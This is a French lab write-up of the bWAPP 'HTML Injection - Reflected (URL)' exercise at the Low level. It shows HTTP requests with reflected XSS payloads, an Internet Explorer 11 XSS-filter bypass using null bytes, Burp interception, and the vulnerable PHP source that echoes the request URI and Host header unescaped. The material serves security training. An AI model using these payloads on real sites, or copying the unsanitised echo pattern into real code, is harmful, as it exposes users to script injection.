# Niveau "Low"

## Exploitation

L'URL est ici réfléchie au sein de la page en utilisant la méthode HTTP `GET` :&#x20;

```http
GET /bWAPP/htmli_current_url.php?parametre=valeur HTTP/1.1
Host: 192.168.56.116
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Cookie: security_level=0; PHPSESSID=2f4611482fb97564af7dbe4243dca828
Connection: close
```

![](<../../../../../.gitbook/assets/image (23).png>)

En PHP, la récupération de l'URL peut s'effectuer grâce aux variables `$_SERVER["REQUEST_URI"]` ou `$_SERVER["QUERYSTRING"]` par exemple (le fonctionnement est différent pour les variables types `$_GET` ou `$_POST` et autres équivalents). Dans le premier cas, les navigateurs récents encodent l'URL avant de la transmettre à l'application qui rend les tentatives d'injections HTML et XSS inefficaces :&#x20;

```http
GET /bWAPP/htmli_current_url.php?parametre=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: 192.168.56.116
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Cookie: security_level=0; PHPSESSID=2f4611482fb97564af7dbe4243dca828
Connection: close
```

![](<../../../../../.gitbook/assets/image (15).png>)

Internet Explorer 11 n'effectue pas cet encodage sur les nom et valeur des paramètres d'URL, par contre il possède un filtre anti-XSS pouvant empêcher l'exécution de script malicieux :&#x20;

![](<../../../../../.gitbook/assets/image (27).png>)

Il existe un contournement fonctionnel sur IE permettant tout de même d'exécuter le code :&#x20;

```http
GET /bWAPP/htmli_current_url.php?parametre=<script/%00%00v%00%00>alert('XSS')</script> HTTP/1.1
Accept: text/html, application/xhtml+xml, image/jxr, */*
Host: 192.168.56.116
Cookie: PHPSESSID=5259cd672a0fb988f6f618b8527b1a8c; security_level=0
Connection: close
```

![](<../../../../../.gitbook/assets/image (10).png>)

Il est tout de même possible d'exploiter la vulnérabilité sur un navigateur récent mais ne sera que très difficilement exécutable dans le contexte de la victime. Pour cela, il faut utiliser la modification de requête grâce à un proxy, ici Burp en mode interception :&#x20;

![](<../../../../../.gitbook/assets/image (13).png>)

![](<../../../../../.gitbook/assets/image (2).png>)

## Analyse du code source

L'application affiche le contenu de la variable $url au d'une balise `<i></i>` :

{% code title="htmli_current_url.php" %}
```php
<div id="man">
  <h1>HTML Injection - Reflected (URL)</h1>
  <?php echo "<p align=\"left\">Your current URL: <i>" . $url . "</i></p>";?>
</div>
```
{% endcode %}

La variable $url est construite de la manière suivante :&#x20;

{% code title="htmli_current_url.php" %}
```php
$url= "";

switch($_COOKIE["security_level"]) {
  case "0" :
    // $url = "http://" . $_SERVER["HTTP_HOST"] . urldecode($_SERVER["REQUEST_URI"]);
    $url = "http://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
    break;
  case "1" :
    $url = "<script>document.write(document.URL)</script>";
    break;
  case "2" :
    $url = "http://" . $_SERVER["HTTP_HOST"] . xss_check_3($_SERVER["REQUEST_URI"]);
    break;
  default :
    // $url = "http://" . $_SERVER["HTTP_HOST"] . urldecode($_SERVER["REQUEST_URI"]);
    $url = "http://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
    break;
}
```
{% endcode %}

Le level "Low" correspond à la valeur 0, c'est à dire qu'ici, la variable $url est construite de la façon suivante :

```php
$url = "http://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
```

La variable permettant la récupération de l'URL était bien celle identifiée dans la phase d'exploitation. A noter qu'il est également possible d'injecter le code HTML/Javascript au sein de l'entête HTTP `Host` dont la valeur sera récupérée par la variable PHP $\_SERVER\["HTTP\_HOST"] :&#x20;

![](<../../../../../.gitbook/assets/image (28).png>)

![](<../../../../../.gitbook/assets/image (18).png>)

{% hint style="warning" %}
Le jeu de caractères possible dans l'entête HTTP Host est limité.
{% endhint %}
